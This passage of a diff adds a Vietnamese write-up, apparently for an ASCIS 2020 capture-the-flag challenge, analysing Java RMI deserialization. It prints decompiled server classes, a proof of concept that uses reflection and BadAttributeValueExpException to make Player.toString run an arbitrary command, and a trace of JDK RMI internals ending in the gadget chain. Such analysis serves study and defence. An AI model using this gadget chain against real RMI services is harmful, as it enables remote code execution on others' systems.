+            <span class="n">registry</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&#34;ascis&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">ASCISInterfImpl</span><span class="o">());</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;ASCIS server is ready&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Exception</span> <span class="n">e</span> <span class="o">=</span> <span class="n">var2</span><span class="o">;</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Interface dùng chung cho cả server và client ở đây là <code>ASCISInterf</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">//
+</span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA
+</span><span class="c1">// (powered by FernFlower decompiler)
+</span><span class="c1">//
+</span><span class="c1"></span>
+<span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">ASCISInterf</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="nf">sayHello</span><span class="o">(</span><span class="n">String</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+
+    <span class="n">String</span> <span class="nf">login</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div><p>Một <code>ASCISInterfImpl</code> là class cha của instance được đăng ký</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">//
+</span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA
+</span><span class="c1">// (powered by FernFlower decompiler)
+</span><span class="c1">//
+</span><span class="c1"></span>
+<span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ASCISInterfImpl</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">ASCISInterf</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">ASCISInterfImpl</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">sayHello</span><span class="o">(</span><span class="n">String</span> <span class="n">playerName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;WELCOME %s to ASCIS 2020 !&#34;</span><span class="o">,</span> <span class="n">playerName</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">login</span><span class="o">(</span><span class="n">Object</span> <span class="n">player</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">msg</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+        <span class="n">Player</span> <span class="n">ascis_player</span> <span class="o">=</span> <span class="o">(</span><span class="n">Player</span><span class="o">)</span><span class="n">player</span><span class="o">;</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;\nLOGGED IN ! Welcome %s to ASCIS 2020 !&#34;</span><span class="o">,</span> <span class="n">ascis_player</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span> <span class="o">+</span> <span class="s">&#34;\nHave a nice day! Bye Bye&#34;</span><span class="o">;</span>
+        <span class="k">return</span> <span class="n">msg</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Tại đây thì ta thấy 2 phương thức được định nghĩa dựa trên interface impl thôi</p>
+<p>Ban đầu chức năng đơn giản của chương trình sẽ là tạo một instance của class này sau đó đăng kí với registry trong cấu trúc rmi để có 1 danh sách instance từ đó mà phía client có thể gọi nó mà không cần đến mã nguồn của class này.</p>
+<p><img src="https://hackmd.io/_uploads/BkdpLvpRye.png" alt="image"></p>
+<p>Ta list danh sách registry ở đây sẽ thấy có <code>[ascis]</code> là bản mà server đã đăng ký -&gt; giờ thì ta chỉ cần gọi nó.</p>
+<p><img src="https://hackmd.io/_uploads/HJCQwPpRyx.png" alt="image"></p>
+<p>chú ý ở đây có 2 method <code>login</code> với đối số là object sau đó được ép kiểu sang <code>Player</code></p>
+<p>Sau đó <code>ascis_player.getName()</code> sẽ được gọi để trả ra msg;</p>
+<p>Đến với lớp <code>Player</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">//
+</span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA
+</span><span class="c1">// (powered by FernFlower decompiler)
+</span><span class="c1">//
+</span><span class="c1"></span>
+<span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Player</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isAdmin</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">logCommand</span> <span class="o">=</span> <span class="s">&#34;echo \&#34;ADMIN LOGGED IN\&#34; &gt; /tmp/log.txt&#34;</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">Player</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isAdmin</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">isAdmin</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAdmin</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">admin</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">isAdmin</span> <span class="o">=</span> <span class="n">admin</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">isAdmin</span><span class="o">())</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">logCommand</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">IOException</span> <span class="n">e</span> <span class="o">=</span> <span class="n">var2</span><span class="o">;</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+
+            <span class="k">return</span> <span class="s">&#34;ADMIN LOGGED IN&#34;</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="s">&#34;USER LOGGED IN&#34;</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>ở đây lại đặc biệt có method toString và check nếu isAdmin là true thì sẽ thực thi logCommand -&gt; điều đáng nói ở đây là ta có thể thay đổi giá trị của isAdmin và logCommand để đạt được rce.</p>
+<p>ở đây ta sẽ lợi dụng java reflection để thay đổi các giá trị này trong quá trình runtime.</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">rmi.ASCISInterf</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">rmi.Player</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.NotBoundException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ASCISPlayer</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">NotBoundException</span><span class="o">,</span> <span class="n">NoSuchFieldException</span><span class="o">,</span> <span class="n">IllegalAccessException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">serverIP</span> <span class="o">=</span> <span class="s">&#34;127.0.0.1&#34;</span><span class="o">;</span> <span class="c1">// Server IP
+</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="s">&#34;1099&#34;</span><span class="o">);</span> <span class="c1">// Server Port
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&#34;lamnt&#34;</span><span class="o">;</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="n">serverIP</span><span class="o">,</span> <span class="n">serverPort</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">registry</span><span class="o">.</span><span class="na">list</span><span class="o">()));</span>
+        <span class="n">rmi</span><span class="o">.</span><span class="na">ASCISInterf</span> <span class="n">ascisInterf</span> <span class="o">=</span> <span class="o">(</span><span class="n">ASCISInterf</span><span class="o">)</span><span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;ascis&#34;</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">ascisInterf</span><span class="o">.</span><span class="na">sayHello</span><span class="o">(</span><span class="n">name</span><span class="o">));</span>
+
+<span class="c1">//        Player pItem = new Player();
+</span><span class="c1">//        BadAttributeValueExpException b = new BadAttributeValueExpException (null);
+</span><span class="c1">//
+</span><span class="c1">//        Field isAdmin = Player.class.getDeclaredField(&#34;isAdmin&#34;);
+</span><span class="c1">//        isAdmin.setAccessible(true);
+</span><span class="c1">//        isAdmin.set(pItem,true);
+</span><span class="c1">//
+</span><span class="c1">//        Field logCommand = Player.class.getDeclaredField(&#34;logCommand&#34;);
+</span><span class="c1">//        logCommand.setAccessible(true);
+</span><span class="c1">//        logCommand.set(pItem, &#34;calc&#34;);
+</span><span class="c1">//
+</span><span class="c1">//        Field val = BadAttributeValueExpException.class.getDeclaredField(&#34;val&#34;);
+</span><span class="c1">//        val.setAccessible(true);
+</span><span class="c1">//        val.set(b, pItem);
+</span><span class="c1">//
+</span><span class="c1">//        System.out.println(ascisInterf.login(b));
+</span><span class="c1"></span>    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Tại sao lại sử dụng <code>BadAttributeValueExpException</code>, do trong <code>Player</code> có method toString(), có thể trigger rce nhưng không có bất kỳ nơi nào có thể gọi nó với flow của chương trình này.</p>
+<p>trên poc ta khởi tạo một instance của class <code>Player</code> -&gt; sau đó ta sẽ dùng reflect để thay đổi trường private <code>isAdmin</code> thành true khi gọi toString sẽ trigger, cùng với đó ta sẽ dùng reflect để thay đổi cả <code>logCommand</code> để thực thi lệnh tùy ý mà ta mong muốn.</p>
+<p>Tiếp theo ta khởi tạo một instance từ class <code>BadAttributeValueExpException</code> sau đó thay đổi trường <code>val</code> thành obj pItem của class Player -&gt; sau đó gọi method login của rmi từ xa với đối số là instance của <code>BadAttributeValueExpException</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">String</span> <span class="nf">login</span><span class="o">(</span><span class="n">Object</span> <span class="n">player</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">msg</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+        <span class="n">Player</span> <span class="n">ascis_player</span> <span class="o">=</span> <span class="o">(</span><span class="n">Player</span><span class="o">)</span><span class="n">player</span><span class="o">;</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;\nLOGGED IN ! Welcome %s to ASCIS 2020 !&#34;</span><span class="o">,</span> <span class="n">ascis_player</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span> <span class="o">+</span> <span class="s">&#34;\nHave a nice day! Bye Bye&#34;</span><span class="o">;</span>
+        <span class="k">return</span> <span class="n">msg</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div><ul>
+<li>Đi sâu hơn vào cơ chế của nó:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Hy6WUzRA1l.png" alt="image"></p>
+<p>Khi client lookup tới <code>ascis</code> trong registry lúc này registry là instance của class <code>RegistryImpl_Stub</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">Remote</span> <span class="nf">lookup</span><span class="o">(</span><span class="n">String</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AccessException</span><span class="o">,</span> <span class="n">NotBoundException</span><span class="o">,</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">RemoteCall</span> <span class="n">var2</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">operations</span><span class="o">,</span> <span class="n">2</span><span class="o">,</span> <span class="n">4905912898345647071L</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">ObjectOutput</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+                <span class="n">var3</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var18</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">&#34;error marshalling arguments&#34;</span><span class="o">,</span> <span class="n">var18</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+
+            <span class="n">Remote</span> <span class="n">var23</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">ObjectInput</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                <span class="n">var23</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var6</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var15</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="o">,</span> <span class="n">var15</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var16</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="o">,</span> <span class="n">var16</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">done</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="k">return</span> <span class="n">var23</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">var19</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="n">var19</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RemoteException</span> <span class="n">var20</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="n">var20</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NotBoundException</span> <span class="n">var21</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="n">var21</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var22</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">UnexpectedException</span><span class="o">(</span><span class="s">&#34;undeclared checked exception&#34;</span><span class="o">,</span> <span class="n">var22</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div><p>Nó sẽ gọi đến cấu hình từ xa -&gt; sau đó serialize obj đó -&gt; sau đó deserialize nó và trả về obj var23 sau khi đã được serialize</p>
+<p>Và lúc này var23 sẽ là giá trị trả về của <code>ascisInterf</code></p>
+<p>Khi ta gọi method với instance được trả về thì:
+<code>System.out.println(ascisInterf.sayHello(name));</code> -&gt;</p>
+<p><code>Proxy[ASCISInterf,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[172.19.27.9:10172](remote),objID:[2abd11e1:196423cb40e:-7fff, -7782728666740562632]]]]]</code></p>
+<p><code>ascisInterf</code> lúc này là một proxy -&gt; nó sẽ gọi <code>RemoteObjectInvocationHandler.invoke</code> với 3 tham số là proxy, method name(đang là sayHello), và đối số giờ đang là String obj.</p>
+<p><img src="https://hackmd.io/_uploads/B1woCf0A1x.png" alt="image"></p>
+<p>Sau đó sẽ gọi method <code>invokeRemoteMethod</code></p>
+<p><img src="https://hackmd.io/_uploads/ryJDy7R0Je.png" alt="image"></p>
+<p>Return giá trị trả về -&gt; gọi <code>invoke</code> của class <code>UnicastRef</code></p>
+<p>Tại <code>UnicastRef</code>:</p>
+<p><img src="https://hackmd.io/_uploads/Hk2kxm00Je.png" alt="image"></p>
+<p>method <code>unmarshalValue</code> tại class <code>UnicastRef</code> được gọi</p>
+<p>tại đây var1 sẽ được deserialize.</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unmarshalValue</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">var0</span><span class="o">,</span> <span class="n">ObjectInput</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readBoolean</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Byte</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readByte</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Character</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readChar</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Short</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readShort</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Long</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readLong</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Float</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readFloat</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Double</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readDouble</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">Error</span><span class="o">(</span><span class="s">&#34;Unrecognized primitive type: &#34;</span> <span class="o">+</span> <span class="n">var0</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div><p><img src="https://hackmd.io/_uploads/HkFWSmCCkx.png" alt="97684cf2a9c29bb250b0387e913ec9da_full%20method%20call%20for%20rmi"></p>
+<p>Như poc ở trên: khi ta truyền vào obj b là <code>BadAttributeValueExpException</code> thì nó sẽ thực hiện serialize obj này và gửi lên phía sever -&gt; server nhận được sẽ deserialize nó -&gt; sau đó val là Obj của <code>Player</code> sẽ gọi method toString do quá trình giải tuần tự hóa sẽ gọi method này của val:</p>
+<pre><code class="language-javaprivate" data-lang="javaprivate">        ObjectInputStream.GetField gf = ois.readFields();
+        Object valObj = gf.get(&quot;val&quot;, null);
+
+        if (valObj == null) {
+            val = null;
+        } else if (valObj instanceof String) {
+            val= valObj;
+        } else if (System.getSecurityManager() == null
+                || valObj instanceof Long
+                || valObj instanceof Integer
+                || valObj instanceof Float
+                || valObj instanceof Double
+                || valObj instanceof Byte
+                || valObj instanceof Short
+                || valObj instanceof Boolean) {
+            val = valObj.toString();
+        } else { // the serialized object is from a version without JDK-8019292 fix
+            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
+        }
+    }
+</code></pre><p>Lúc này thì gọi toString và kiểm tra isAdmin, logCommand đã được thay đổi -&gt; việc rce thành công</p>
+<h4 id="gadget-chain">Gadget chain</h4>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="o">-&gt;</span> <span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="n">readObject</span><span class="p">()</span>
+        <span class="o">-&gt;</span><span class="n">Player</span><span class="p">.</span><span class="n">toString</span><span class="p">()</span>
+            <span class="o">-&gt;</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="n">exec</span><span class="p">(</span><span class="n">logCommand</span><span class="p">)</span>
+</code></pre></div><h3 id="chi-tiết-về-quá-trình-xử-lý-khi-register-object-với-registry-của-server">Chi tiết về quá trình xử lý khi register object với Registry của Server</h3>
+<p><img src="https://hackmd.io/_uploads/SkcFqQCAJe.png" alt="image"></p>
+<p>Đầu tiên khi gọi <code>createRegistry</code> với port <code>1099</code> -&gt; khởi tạo một obj <code>RegistryImpl</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="nf">RegistryImpl</span><span class="o">(</span><span class="kd">final</span> <span class="kt">int</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">==</span> <span class="n">1099</span> <span class="o">&amp;&amp;</span> <span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedExceptionAction</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;()</span> <span class="o">{</span>
+                    <span class="kd">public</span> <span class="n">Void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+                        <span class="n">LiveRef</span> <span class="n">var1x</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LiveRef</span><span class="o">(</span><span class="n">RegistryImpl</span><span class="o">.</span><span class="na">id</span><span class="o">,</span> <span class="n">var1</span><span class="o">);</span>
+                        <span class="n">RegistryImpl</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">setup</span><span class="o">(</span><span class="k">new</span> <span class="n">UnicastServerRef</span><span class="o">(</span><span class="n">var1x</span><span class="o">));</span>
+                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">},</span> <span class="o">(</span><span class="n">AccessControlContext</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">SocketPermission</span><span class="o">(</span><span class="s">&#34;localhost:&#34;</span> <span class="o">+</span> <span class="n">var1</span><span class="o">,</span> <span class="s">&#34;listen,accept&#34;</span><span class="o">));</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">PrivilegedActionException</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="o">(</span><span class="n">RemoteException</span><span class="o">)</span><span class="n">var3</span><span class="o">.</span><span class="na">getException</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
